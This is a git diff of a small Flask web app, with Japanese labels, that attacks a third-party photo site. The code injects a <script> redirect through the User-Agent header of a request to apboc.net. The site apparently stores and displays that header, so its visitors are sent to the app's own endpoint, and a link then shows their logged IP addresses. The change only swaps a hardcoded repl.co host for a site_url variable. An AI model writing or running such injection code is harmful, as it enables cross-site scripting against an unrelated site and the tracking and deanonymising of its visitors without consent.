@@ -1,6 +1,7 @@
 from flask import Flask,request,redirect,render_template
 import requests,random
 
+site_url=""
 
 app = Flask(__name__)
 
@@ -16,10 +17,10 @@ def inscript():
       return "ParamError",400
     page_url=page_url.replace("http://apboc.net/photo/","")
     page_id=str(random.randint(1234,8999))
-    agent_script=fr"<script>location.href='https://wiltedspiffyexponent.tkodai0417.repl.co/gyaku?id={page_id}'</script>"
+    agent_script=fr"<script>location.href='{site_url}/gyaku?id={page_id}'</script>"
     header={"User-Agent":agent_script}
     requests.get(f"http://apboc.net/photo/{page_url}",headers=header)
-    return f"<a href='https://wiltedspiffyexponent.tkodai0417.repl.co/ip/{page_id}'>確認ページ</a>"
+    return f"<a href='{site_url}/ip/{page_id}'>確認ページ</a>"
 
 @app.route('/ip/<id>')
 def get_ip(id):
